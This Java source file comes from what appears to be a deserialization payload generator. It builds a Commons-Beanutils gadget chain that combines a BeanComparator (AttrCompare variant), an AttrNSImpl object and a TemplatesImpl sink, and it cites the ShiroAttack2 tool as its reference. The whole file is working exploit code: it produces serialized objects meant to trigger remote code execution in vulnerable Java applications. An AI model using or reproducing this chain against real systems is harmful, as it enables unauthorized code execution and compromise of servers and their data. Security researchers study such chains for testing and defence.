package com.ppp.chain.commonsbeanutils;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;

import java.util.Comparator;

/**
 * @author Whoopsunix
 * Ref: https://github.com/SummerSec/ShiroAttack2
 * <p>
 * CommonsBeanutilsAttrCompare
 */
@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4"})
@Authors({Authors.DROPLET})
@Sink({Sink.TemplatesImpl})
public class CommonsBeanutils4 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils4.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject, sinksHelper.getCbVersion());

        return kickOffObject;
    }

    public Object getChain(Object templates, CBVersionEnum version) throws Exception {
        AttrNSImpl attrNS = new AttrNSImpl(new CoreDocumentImpl(), "1", "1", "1");
        Comparator comparator = BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.AttrCompare, version);
        return BeanComparatorBuilder.queueGadgetMaker(comparator, templates, attrNS, "outputProperties");
    }
}
